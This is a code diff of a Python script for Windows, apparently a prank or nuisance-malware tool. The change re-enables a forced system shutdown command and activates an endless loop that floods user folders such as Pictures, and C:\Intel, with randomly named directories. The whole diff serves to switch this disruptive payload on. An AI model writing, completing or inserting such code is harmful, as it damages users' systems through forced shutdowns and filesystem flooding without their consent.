@@ -22,13 +22,12 @@ addres_7 = "C:\\Users\\" + username + "\\Pictures"
 addres_8 = "C:\\Intel"
 name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)'
 # turn off the system ofter 10 sec
-#system("shutdown/s")
+system("shutdown/s")
 while True:
     # make random name for directory
     print(addres_3)
     directory = "".join(sample(name, 10))
     # create the directories
-    '''
     mkdir(addres_1 + "\\{}".format(directory))
     mkdir(addres_2 + "\\{}".format(directory))
     mkdir(addres_3 + "\\{}".format(directory))
@@ -37,4 +36,3 @@ while True:
     mkdir(addres_6 + "\\{}".format(directory))
     mkdir(addres_7 + "\\{}".format(directory))
     mkdir(addres_8 + "\\{}".format(directory))
-'''
